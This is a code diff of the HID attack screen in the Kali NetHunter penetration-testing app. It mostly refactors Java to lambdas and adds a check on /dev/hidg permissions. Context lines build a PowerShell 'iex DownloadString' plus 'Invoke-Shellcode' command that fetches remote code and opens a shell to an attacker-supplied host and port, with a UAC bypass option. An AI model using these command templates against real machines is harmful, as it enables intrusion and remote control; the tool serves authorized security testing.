@@ -2,18 +2,12 @@ package com.offsec.nethunter;
 
 import android.app.Activity;
 import android.content.Context;
-import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Parcelable;
-import androidx.fragment.app.Fragment;
-import androidx.fragment.app.FragmentManager;
-import androidx.fragment.app.FragmentPagerAdapter;
-import androidx.viewpager.widget.ViewPager;
-import androidx.appcompat.app.AlertDialog;
 import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuInflater;
@@ -35,6 +29,12 @@ import java.io.OutputStreamWriter;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import androidx.appcompat.app.AlertDialog;
+import androidx.fragment.app.Fragment;
+import androidx.fragment.app.FragmentManager;
+import androidx.fragment.app.FragmentPagerAdapter;
+import androidx.viewpager.widget.ViewPager;
+
 public class HidFragment extends Fragment {
 
     private ViewPager mViewPager;
@@ -53,6 +53,7 @@ public class HidFragment extends Fragment {
         fragment.setArguments(args);
         return fragment;
     }
+    private boolean isHIDenable = false;
 
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
@@ -60,7 +61,7 @@ public class HidFragment extends Fragment {
         View rootView = inflater.inflate(R.layout.hid, container, false);
         HidFragment.TabsPagerAdapter tabsPagerAdapter = new TabsPagerAdapter(getActivity().getSupportFragmentManager());
 
-        mViewPager = (ViewPager) rootView.findViewById(R.id.pagerHid);
+        mViewPager = rootView.findViewById(R.id.pagerHid);
         mViewPager.setAdapter(tabsPagerAdapter);
 
         nh = new NhPaths();
@@ -74,7 +75,9 @@ public class HidFragment extends Fragment {
         });
         setHasOptionsMenu(true);
         sharedpreferences = getActivity().getSharedPreferences("com.offsec.nethunter", Context.MODE_PRIVATE);
+        check_HID_enable();
         return rootView;
+
     }
 
 
@@ -98,7 +101,11 @@ public class HidFragment extends Fragment {
     public boolean onOptionsItemSelected(MenuItem item) {
         switch (item.getItemId()) {
             case R.id.start_service:
-                start();
+                if (isHIDenable) {
+                    start();
+                } else {
+                    nh.showMessage_long("HID interfaces are not enabled or something wrong with the permission of /dev/hidg*, make sure they are enabled and permissions are granted as 666");
+                }
                 return true;
             case R.id.stop_service:
                 reset();
@@ -168,6 +175,7 @@ public class HidFragment extends Fragment {
         }
 
         int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
+	final String[] check_hid_permission = new String[2];
         final String[] command = new String[1];
         int pageNum = mViewPager.getCurrentItem();
         if (pageNum == 0) {
@@ -207,21 +215,12 @@ public class HidFragment extends Fragment {
                     break;
             }
         }
-        nh.showMessage("Attack launched...");
-        new Thread(new Runnable() {
-            public void run() {
-                ShellExecuter exe = new ShellExecuter();
-                exe.RunAsRoot(command);
-                //Logger.appendLog(outp1);
-                mViewPager.post(new Runnable() {
-                    @Override
-                    public void run() {
-
-                        nh.showMessage("Attack execution ended.");
-                    }
-                });
-            }
-
+        nh.showMessage(getString(R.string.attack_launched));
+        new Thread(() -> {
+            ShellExecuter exe = new ShellExecuter();
+            exe.RunAsRoot(command);
+            //Logger.appendLog(outp1);
+            mViewPager.post(() -> nh.showMessage("Attack execution ended."));
         }).start();
     }
 
@@ -238,21 +237,13 @@ public class HidFragment extends Fragment {
         int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
         AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
         builder.setTitle("UAC Bypass:");
-        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
-
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-            }
+        builder.setPositiveButton("OK", (dialog, which) -> {
         });
 
-        builder.setSingleChoiceItems(platforms, UACBypassIndex, new DialogInterface.OnClickListener() {
-
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                Editor editor = sharedpreferences.edit();
-                editor.putInt("UACBypassIndex", which);
-                editor.apply();
-            }
+        builder.setSingleChoiceItems(platforms, UACBypassIndex, (dialog, which) -> {
+            Editor editor = sharedpreferences.edit();
+            editor.putInt("UACBypassIndex", which);
+            editor.apply();
         });
         builder.show();
     }
@@ -263,22 +254,14 @@ public class HidFragment extends Fragment {
 
         AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
         builder.setTitle("Keyboard Layout:");
-        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
+        builder.setPositiveButton("OK", (dialog, which) -> {
 
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-
-            }
         });
 
-        builder.setSingleChoiceItems(languages, keyboardLayoutIndex, new DialogInterface.OnClickListener() {
-
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                Editor editor = sharedpreferences.edit();
-                editor.putInt("HIDKeyboardLayoutIndex", which);
-                editor.apply();
-            }
+        builder.setSingleChoiceItems(languages, keyboardLayoutIndex, (dialog, which) -> {
+            Editor editor = sharedpreferences.edit();
+            editor.putInt("HIDKeyboardLayoutIndex", which);
+            editor.apply();
         });
         builder.show();
     }
@@ -333,7 +316,7 @@ public class HidFragment extends Fragment {
         public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                  Bundle savedInstanceState) {
             View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
-            Button b = (Button) rootView.findViewById(R.id.powersploitOptionsUpdate);
+            Button b = rootView.findViewById(R.id.powersploitOptionsUpdate);
             b.setOnClickListener(this);
             loadOptions(rootView);
             return rootView;
@@ -346,13 +329,13 @@ public class HidFragment extends Fragment {
                         return;
                     }
                     ShellExecuter exe = new ShellExecuter();
-                    EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
-                    EditText port = (EditText) getView().findViewById(R.id.port);
+                    EditText ip = getView().findViewById(R.id.ipaddress);
+                    EditText port = getView().findViewById(R.id.port);
 
-                    Spinner payload = (Spinner) getView().findViewById(R.id.payload);
+                    Spinner payload = getView().findViewById(R.id.payload);
                     String payloadValue = payload.getSelectedItem().toString();
 
-                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
+                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
                     String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
                     String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
@@ -368,64 +351,59 @@ public class HidFragment extends Fragment {
         }
 
         private void loadOptions(final View rootView) {
-            final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
-            final EditText port = (EditText) rootView.findViewById(R.id.port);
-            final Spinner payload = (Spinner) rootView.findViewById(R.id.payload);
+            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
+            final EditText port = rootView.findViewById(R.id.port);
+            final Spinner payload = rootView.findViewById(R.id.payload);
             final ShellExecuter exe = new ShellExecuter();
 
-            new Thread(new Runnable() {
-                public void run() {
-                    final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
-                    final String text = exe.ReadFile_SYNC(configFilePath);
-                    String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
-                    Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
-                    final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
+            new Thread(() -> {
+                final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
+                final String text = exe.ReadFile_SYNC(configFilePath);
+                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
+                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
+                final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
 
-                    String[] lines = text.split("\n");
-                    final String line = lines[lines.length - 1];
+                String[] lines = text.split("\n");
+                final String line = lines[lines.length - 1];
 
-                    String regExPatIp = "-Lhost\\ (.*)\\ -Lport";
-                    Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
-                    final Matcher matcherIp = patternIp.matcher(line);
+                String regExPatIp = "-Lhost\\ (.*)\\ -Lport";
+                Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
+                final Matcher matcherIp = patternIp.matcher(line);
 
-                    String regExPatPort = "-Lport\\ (.*)\\ -Force";
-                    Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
-                    final Matcher matcherPort = patternPort.matcher(line);
+                String regExPatPort = "-Lport\\ (.*)\\ -Force";
+                Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
+                final Matcher matcherPort = patternPort.matcher(line);
 
-                    String regExPatPayload = "-Payload\\ (.*)\\ -Lhost";
-                    Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
-                    final Matcher matcherPayload = patternPayload.matcher(line);
+                String regExPatPayload = "-Payload\\ (.*)\\ -Lhost";
+                Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
+                final Matcher matcherPayload = patternPayload.matcher(line);
 
-                    payloadUrl.post(new Runnable() {
-                        @Override
-                        public void run() {
+                payloadUrl.post(() -> {
 
-                            if (matcherPayloadUrl.find()) {
-                                String payloadUrlValue = matcherPayloadUrl.group(1);
-                                payloadUrl.setText(payloadUrlValue);
-                            }
+                    if (matcherPayloadUrl.find()) {
+                        String payloadUrlValue = matcherPayloadUrl.group(1);
+                        payloadUrl.setText(payloadUrlValue);
+                    }
 
-                            if (matcherIp.find()) {
-                                String ipValue = matcherIp.group(1);
-                                EditText ip = (EditText) rootView.findViewById(R.id.ipaddress);
-                                ip.setText(ipValue);
-                            }
+                    if (matcherIp.find()) {
+                        String ipValue = matcherIp.group(1);
+                        EditText ip = rootView.findViewById(R.id.ipaddress);
+                        ip.setText(ipValue);
+                    }
 
-                            if (matcherPort.find()) {
-                                String portValue = matcherPort.group(1);
-                                port.setText(portValue);
-                            }
+                    if (matcherPort.find()) {
+                        String portValue = matcherPort.group(1);
+                        port.setText(portValue);
+                    }
 
-                            if (matcherPayload.find()) {
-                                String payloadValue = matcherPayload.group(1);
-                                ArrayAdapter myAdap = (ArrayAdapter) payload.getAdapter();
-                                int spinnerPosition;
-                                spinnerPosition = myAdap.getPosition(payloadValue);
-                                payload.setSelection(spinnerPosition);
-                            }
-                        }
-                    });
-                }
+                    if (matcherPayload.find()) {
+                        String payloadValue = matcherPayload.group(1);
+                        ArrayAdapter myAdap = (ArrayAdapter) payload.getAdapter();
+                        int spinnerPosition;
+                        spinnerPosition = myAdap.getPosition(payloadValue);
+                        payload.setSelection(spinnerPosition);
+                    }
+                });
             }).start();
         }
     }
@@ -441,11 +419,11 @@ public class HidFragment extends Fragment {
         public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                  Bundle savedInstanceState) {
             View rootView = inflater.inflate(R.layout.hid_windows_cmd, container, false);
-            EditText source = (EditText) rootView.findViewById(R.id.windowsCmdSource);
+            EditText source = rootView.findViewById(R.id.windowsCmdSource);
             exe.ReadFile_ASYNC(configFilePath, source);
-            Button b = (Button) rootView.findViewById(R.id.windowsCmdUpdate);
-            Button b1 = (Button) rootView.findViewById(R.id.windowsCmdLoad);
-            Button b2 = (Button) rootView.findViewById(R.id.windowsCmdSave);
+            Button b = rootView.findViewById(R.id.windowsCmdUpdate);
+            Button b1 = rootView.findViewById(R.id.windowsCmdLoad);
+            Button b2 = rootView.findViewById(R.id.windowsCmdSave);
             b.setOnClickListener(this);
             b1.setOnClickListener(this);
             b2.setOnClickListener(this);
@@ -461,7 +439,7 @@ public class HidFragment extends Fragment {
                     if (getView() == null) {
                         return;
                     }
-                    EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
+                    EditText source = getView().findViewById(R.id.windowsCmdSource);
                     String text = source.getText().toString();
                     Boolean isSaved = exe.SaveFileContents(text, configFilePath);
                     if (isSaved) {
@@ -497,41 +475,37 @@ public class HidFragment extends Fragment {
                     final EditText input = new EditText(getActivity());
                     alert.setView(input);
 
-                    alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
-                        public void onClick(DialogInterface dialog, int whichButton) {
-                            String value = input.getText().toString();
-                            if (!value.equals("") && value.length() > 0) {
-                                //FIXME Save file (ask name)
-                                File scriptFile = new File(loadFilePath + File.separator + value + ".conf");
-                                if (!scriptFile.exists()) {
-                                    try {
-                                        if (getView() == null) {
-                                            return;
-                                        }
-                                        EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
-                                        String text = source.getText().toString();
-                                        scriptFile.createNewFile();
-                                        FileOutputStream fOut = new FileOutputStream(scriptFile);
-                                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
-                                        myOutWriter.append(text);
-                                        myOutWriter.close();
-                                        fOut.close();
-                                        nh.showMessage("Script saved");
-                                    } catch (Exception e) {
-                                        nh.showMessage(e.getMessage());
+                    alert.setPositiveButton("Ok", (dialog, whichButton) -> {
+                        String value = input.getText().toString();
+                        if (!value.equals("") && value.length() > 0) {
+                            //FIXME Save file (ask name)
+                            File scriptFile = new File(loadFilePath + File.separator + value + ".conf");
+                            if (!scriptFile.exists()) {
+                                try {
+                                    if (getView() == null) {
+                                        return;
                                     }
-                                } else {
-                                    nh.showMessage("File already exists");
+                                    EditText source1 = getView().findViewById(R.id.windowsCmdSource);
+                                    String text1 = source1.getText().toString();
+                                    scriptFile.createNewFile();
+                                    FileOutputStream fOut = new FileOutputStream(scriptFile);
+                                    OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
+                                    myOutWriter.append(text1);
+                                    myOutWriter.close();
+                                    fOut.close();
+                                    nh.showMessage("Script saved");
+                                } catch (Exception e) {
+                                    nh.showMessage(e.getMessage());
                                 }
                             } else {
-                                nh.showMessage("Wrong name provided");
+                                nh.showMessage("File already exists");
                             }
+                        } else {
+                            nh.showMessage("Wrong name provided");
                         }
                     });
-                    alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
-                        public void onClick(DialogInterface dialog, int whichButton) {
-                            ///Do nothing
-                        }
+                    alert.setNegativeButton("Cancel", (dialog, whichButton) -> {
+                        ///Do nothing
                     });
                     alert.show();
                     break;
@@ -547,7 +521,7 @@ public class HidFragment extends Fragment {
                 case PICKFILE_RESULT_CODE:
                     if (resultCode == Activity.RESULT_OK && getView() != null) {
                         String FilePath = data.getData().getPath();
-                        EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
+                        EditText source = getView().findViewById(R.id.windowsCmdSource);
                         exe.ReadFile_ASYNC(FilePath, source);
                         nh.showMessage("Script loaded");
                     }
@@ -565,7 +539,7 @@ public class HidFragment extends Fragment {
         public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                  Bundle savedInstanceState) {
             View rootView = inflater.inflate(R.layout.hid_powershell_http, container, false);
-            Button b = (Button) rootView.findViewById(R.id.powershellOptionsUpdate);
+            Button b = rootView.findViewById(R.id.powershellOptionsUpdate);
             b.setOnClickListener(this);
             loadOptions(rootView);
             return rootView;
@@ -578,7 +552,7 @@ public class HidFragment extends Fragment {
                         return;
                     }
                     ShellExecuter exe = new ShellExecuter();
-                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
+                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
                     String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
 
                     Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
@@ -593,35 +567,45 @@ public class HidFragment extends Fragment {
         }
 
         private void loadOptions(final View rootView) {
-            final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
+            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
             final ShellExecuter exe = new ShellExecuter();
 
-            new Thread(new Runnable() {
-                public void run() {
-                    final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
-                    final String text = exe.ReadFile_SYNC(configFilePath);
-                    String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
-                    Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
-                    final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
+            new Thread(() -> {
+                final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
+                final String text = exe.ReadFile_SYNC(configFilePath);
+                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
+                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
+                final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
 
-                    String[] lines = text.split("\n");
-                    final String line = lines[lines.length - 1];
+                String[] lines = text.split("\n");
+                final String line = lines[lines.length - 1];
 
-                    payloadUrl.post(new Runnable() {
-                        @Override
-                        public void run() {
+                payloadUrl.post(() -> {
 
-                            if (matcherPayloadUrl.find()) {
-                                String payloadUrlValue = matcherPayloadUrl.group(1);
-                                payloadUrl.setText(payloadUrlValue);
-                            }
+                    if (matcherPayloadUrl.find()) {
+                        String payloadUrlValue = matcherPayloadUrl.group(1);
+                        payloadUrl.setText(payloadUrlValue);
+                    }
 
-                        }
-                    });
-                }
+                });
             }).start();
         }
     }
 
+    private void check_HID_enable() {
+        new Thread(new Runnable() {
+            public void run() {
+                ShellExecuter exe_check = new ShellExecuter();
+                String hidgs[] = {"/dev/hidg0", "/dev/hidg1"};
+                for (String hidg : hidgs) {
+                    if (!exe_check.RunAsRootOutput("su -c \"stat -c '%a' " + hidg + "\"").equals("666")) {
+                        isHIDenable = false;
+                        break;
+                    }
+                    isHIDenable = true;
+                }
+            }
+        }).start();
+    }
 
 }
